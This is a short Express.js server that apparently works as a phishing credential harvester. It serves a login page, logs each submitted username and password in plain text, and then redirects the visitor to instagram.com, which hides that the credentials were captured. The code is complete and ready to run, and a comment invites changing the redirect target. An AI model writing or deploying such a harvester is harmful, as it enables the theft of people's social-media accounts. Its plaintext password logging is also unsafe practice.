const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like HTML, CSS, JS, images)
app.use(express.static('public'));

// Serve the login page when accessing the root URL
app.get('/', (req, res) => {
    console.log('Sending login page...');
    res.sendFile(__dirname + '/public/login.html');  // Adjust if needed
});

// Handle form submission (if needed for server-side logic)
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`Received login request with username: ${username} and password: ${password}`);
    
    // Redirect to the desired URL after login (this could be dynamic)
    res.redirect('https://www.instagram.com'); // Change this URL to your desired destination
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
